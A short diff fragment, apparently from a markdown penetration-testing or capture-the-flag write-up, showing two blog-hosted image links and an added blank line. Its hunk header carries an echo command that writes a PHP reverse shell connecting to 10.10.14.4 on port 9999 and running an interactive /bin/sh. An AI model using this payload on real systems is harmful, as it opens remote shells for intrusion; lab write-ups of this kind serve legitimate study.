@@ -110,3 +110,4 @@ echo '<?php $sock=fsockopen("10.10.14.4",9999);exec("/bin/sh -i <&3 >&3 2>&3"); 
 ![image-20211016005231886](http://cdn.mxrblog.cn/image-20211016005231886.png)
 
 ![image-20211016005328866](http://cdn.mxrblog.cn/image-20211016005328866.png)
+
